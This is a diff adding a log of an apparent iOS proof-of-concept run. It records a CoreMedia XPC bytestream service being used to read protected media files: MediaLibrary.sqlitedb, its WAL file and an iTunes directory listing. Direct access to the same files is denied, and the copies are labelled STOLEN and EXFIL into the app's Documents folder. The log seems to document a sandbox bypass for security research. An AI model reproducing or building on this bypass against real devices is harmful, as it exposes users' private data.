@@ -1,0 +1,23 @@
+[-0s] === CoreMedia bytestream PoC (clean bundle) ===
+[+0s] device=iPhone os=iOS 26.5 pid=2758
+[+0s] STEP2 connected to mediaplaybackd.bytestream.xpc
+[+0s] STEP3 '.rp1' reply=dictionary
+[+0s] STEP3 '.rp2' recipSt=0 reply=dictionary
+[+0s] STEP3 '.org' beginSt=0 reply=dictionary
+[+0s] STEP3 '.org' completeSt=0 origin=true
+[+0s] CTRL[medialib] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] CTRL[itunes-dir] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] DENIED[oracle-real] err=-12203 desc=<dictionary: 0x10787c300> { count = 2, transaction: 0, voucher = 0x0, contents = 	".ErrorReturn" => <int64: 0xb75e4f7052b9c477>: -12203 	".Token" => <int64: 0xb721b08fad477f07>: 1851 }
+[+0s] DENIED[oracle-fake] err=-17913 desc=<dictionary: 0x10787c600> { count = 2, transaction: 0, voucher = 0x0, contents = 	".ErrorReturn" => <int64: 0xb75e4f7052ba96e7>: -17913 	".Token" => <int64: 0xb721b08fad477f07>: 1851 }
+[+0s] STREAM[medialib] oid=521020077496081409 len=0 dpid=0 path=/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb
+[+0s] STOLEN[medialib] fd=4 size=749568 uid=501 mode=100644 head64=53514c69746520666f726d617420330010000202004020200000000f000000b7000000b70000000300000268000000040000000000000000000000010023dbb0
+[+0s] EXFIL[medialib] 749568B -> Documents/wave4_stolen_medialib.bin
+[+0s] READ[medialib] n=64 len=64 head64=53514c69746520666f726d617420330010000202004020200000000f000000b7000000b70000000300000268000000040000000000000000000000010023dbb0
+[+0s] STREAM[medialib-wal] oid=521020077496081665 len=0 dpid=0 path=/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb-wal
+[+0s] STOLEN[medialib-wal] fd=4 size=2175392 uid=501 mode=100644 head64=377f0682002de2180000100000000001bc598da703aa3f067d745ccf3c9bde770000001f00000000bc598da703aa3f06ccccdb6231db41c10d0c1e00160bb305
+[+0s] EXFIL[medialib-wal] 2175392B -> Documents/wave4_stolen_medialib-wal.bin
+[+0s] READ[medialib-wal] n=64 len=64 head64=377f0682002de2180000100000000001bc598da703aa3f067d745ccf3c9bde770000001f00000000bc598da703aa3f06ccccdb6231db41c10d0c1e00160bb305
+[+0s] STREAM[itunes-dir] oid=521020077496081921 len=0 dpid=0 path=/private/var/mobile/Media/iTunes_Control/iTunes
+[+0s] DIR-LIST[itunes-dir] entries=18 sorted=.,..,[redacted],[redacted],IC-Info.sidf,IC-Info.sidv,MediaLibrary.sqlitedb,MediaLibrary.sqlitedb-shm,MediaLibrary.sqlitedb-wal,PlayCounts.plist,PlayCounts.plist.cig,VoiceMemos.plist,[redacted],[redacted],iTunesCDB,iTunesControl,iTunesSyncDeletes.plist,lh_map_itunes
+[+0s] READ[itunes-dir] n=0 no-data <dictionary: 0x10787c400> { count = 2, transaction: 0, voucher = 0x0, contents = 	".ErrorReturn" => <int64: 0xb721b08fad474677>: 21 	".Token" => <int64: 0xb721b08fad477f07>: 1851 }
+[+0s] === END ===
